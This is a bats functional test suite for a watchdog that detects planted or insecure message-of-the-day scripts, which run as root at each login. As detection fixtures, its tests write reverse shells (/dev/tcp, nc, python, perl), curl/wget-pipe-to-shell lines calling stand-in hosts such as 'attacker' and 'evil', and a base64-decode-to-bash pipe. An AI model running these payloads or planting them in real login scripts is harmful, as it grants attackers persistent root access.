#!/usr/bin/env bats
# L2 bats functional tests for the motd-scripts-watchdog scan script.
#
# pam_motd runs the scripts in /etc/update-motd.d AS ROOT on every
# interactive login to build the dynamic message-of-the-day — a per-login
# root-exec surface. A planted script that is world-writable / non-root-
# owned, or contains a command-injection pattern, is alert (T1546).
#
# Run with: bats packaging/test/L2-motd-scripts-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/motd-scripts-watchdog/systemd/motd-scripts-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    HOOKD="${TMP}/update-motd.d"; mkdir -p "${HOOKD}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_MOTD_PROFILE="${PROFILE:-report}" \
    SELFDEF_MOTD_BASELINE="${BASELINE}" \
    SELFDEF_MOTD_DIRS="${DIRS_V:-$HOOKD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '#!/bin/sh\n# 00-header\nuname -snrvm\n' > "${HOOKD}/00-header"
}

@test "no motd dir → ok / no_motd_dir" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_motd_dir"'
    cap | grep -q '"severity":"ok"'
}

@test "benign motd script, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged motd scripts on second run → ok / motd_scripts_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"motd_scripts_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a motd script with an injection pattern → alert / motd_scripts_suspicious" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${HOOKD}/00-header"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"motd_scripts_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable motd script → alert" {
    seed_benign
    run_wd
    chmod 0666 "${HOOKD}/00-header"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign motd script change → warn / motd_scripts_changed" {
    seed_benign
    run_wd
    printf '#!/bin/sh\n# 00-header updated\nuname -a\n' > "${HOOKD}/00-header"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"motd_scripts_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned motd script is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious motd script" {
    seed_benign
    run_wd
    printf '#!/bin/sh\ncurl http://evil/p|sh\n' > "${HOOKD}/00-header"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — motd script inventory enumerates per-login root-exec surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in motd script → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/00-header"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in motd script → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${HOOKD}/00-header"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in motd script → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${HOOKD}/00-header"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable motd script): group-writable → alert above world-writable bar" {
    seed_benign
    run_wd
    chmod 0664 "${HOOKD}/00-header"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable motd script): baseline_initial fires alert at install-time" {
    seed_benign
    chmod 0666 "${HOOKD}/00-header"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "DELTA detect — ADDED motd script (attacker drops a new update-motd.d script) surfaces in sample" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\necho "new"\n' > "${HOOKD}/99-distinctive-attacker"
    run_wd
    cap | grep -q 'distinctive-attacker'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-motd-scripts -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): motd-scripts-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
    # T1546 per-login root exec persistence — injection alert MUST
    # persist across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/00-header"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"motd_scripts_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
    # motd scripts are /bin/sh; # comments. Operator notes about
    # hypothetical attack patterns must NOT trigger alert.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n# 00-header\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\nuname -snrvm\n' > "${HOOKD}/00-header"
    run_wd
    ! cap | grep -q '"event":"motd_scripts_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir scan: /etc/update-motd.d + /run/motd.dynamic.d axes — injection in ANY → alert)" {
    # pam_motd reads update-motd.d AND there's /run/motd.dynamic.d
    # for runtime additions. Lock multi-dir axis.
    HOOKD2="${TMP}/motd.dynamic.d"; mkdir -p "${HOOKD2}"
    seed_benign
    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant injection in second dir.
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD2}/evil-motd"
    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    # curl | bash is a common bootstrap variant. Lock detection of
    # the bash suffix in addition to sh.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${HOOKD}/00-header"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in motd script: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
    # dhcpcd-hooks/display-manager-hooks/dnf-plugins/fail2ban-action/
    # grub-config/initramfs-hooks/kernel-install-hooks nc reverse-
    # shell variant INVARIANTs across the brain. Lock the netcat axis
    # on the login-message-triggered root-exec persistence surface
    # (T1546.004 — pam_motd runs update-motd.d scripts AS ROOT around
    # every interactive login).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${HOOKD}/00-header"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on motd script surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the login-
    # message-triggered root-exec persistence surface (T1546.004
    # — pam_motd runs update-motd.d scripts AS ROOT around every
    # interactive login).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${HOOKD}/00-header"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (DELTA detect — ADDED distinctive-attacker-named motd script surfaces in sample for operator-triage routing)" {
    # Sister to many other watchdog DELTA-detect sample-naming
    # INVARIANTs across the brain. When an attacker drops a new
    # update-motd.d script (T1546.004 — pam_motd runs scripts AS
    # ROOT around every interactive login; recurring trigger),
    # the file name MUST surface in the JSON sample so operator
    # dashboard routes triage to the right path.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\necho new\n' > "${HOOKD}/99-distinctive-attacker-motd"
    chmod 0755 "${HOOKD}/99-distinctive-attacker-motd"
    run_wd
    cap | grep -q 'distinctive-attacker-motd'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on motd script surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp motd-script
    # rev-shell variants. Perl on every Debian/Ubuntu. Locks
    # perl axis on T1546.004 motd per-login-trigger root-exec
    # persistence.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${HOOKD}/00-header"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (exec-path under writable-root: motd script invoking binary from /tmp → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs across
    # the brain. Beyond inline reverse-shell payloads, attackers
    # may keep the motd script benign-looking but have it invoke
    # a binary they've staged in /tmp / /var/tmp / /dev/shm.
    # T1546.004 pam_motd-as-root persistence then runs the
    # writable-root binary AS ROOT at every interactive login.
    # Locks writable-root-exec axis on per-login motd surface.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n/tmp/staged_payload\n' > "${HOOKD}/00-header"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (exec-path under writable-root: motd script invoking binary from /dev/shm → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. T1546.004
    # pam_motd-as-root persistence — /dev/shm tmpfs in-RAM:
    # no on-disk forensic trace.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n/dev/shm/staged_payload\n' > "${HOOKD}/00-header"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on motd-scripts surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The motd-scripts-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1546.004 pam_motd-as-root persistence
    # alert. Locks parser contract on the update-motd.d
    # detection surface.
    seed_benign
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok / baseline
    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\n' > "${HOOKD}/00-header"
    run_wd                                              # alert path
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # motd-scripts-watchdog runs ON the timer's scheduled fire —
    # scans /etc/update-motd.d for injection patterns, emits a
    # verdict, then exits. Type=simple would break timer
    # OnUnitActiveSec semantics. Locks oneshot-probe contract on
    # the motd-scripts-watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/motd-scripts-watchdog/systemd/selfdef-motd-scripts.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}
